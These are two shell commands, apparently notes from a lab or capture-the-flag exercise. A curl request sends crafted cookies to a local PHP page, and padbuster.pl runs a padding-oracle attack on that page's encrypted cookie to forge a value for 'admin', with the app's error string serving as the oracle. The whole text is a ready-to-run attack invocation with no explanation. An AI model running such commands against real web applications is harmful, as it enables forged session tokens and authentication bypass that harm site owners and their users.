curl -v -H "Cookie: ID=AAAAAAAAAAAAAAAAAAAAAA==; token=gKENdsXk8OgGoDrSp/JXEQ==" http://localhost:8085/index.php
./padbuster.pl http://localhost:8085/index.php AAAAAAAAAAAAAAAAAAAAAA== 16 -noiv admin -cookies ID=AAAAAAAAAAAAAAAAAAAAAA==;token=AAAAAAAAAAAAAAAAAAAAAA== -encoding 0 -error ERROR!
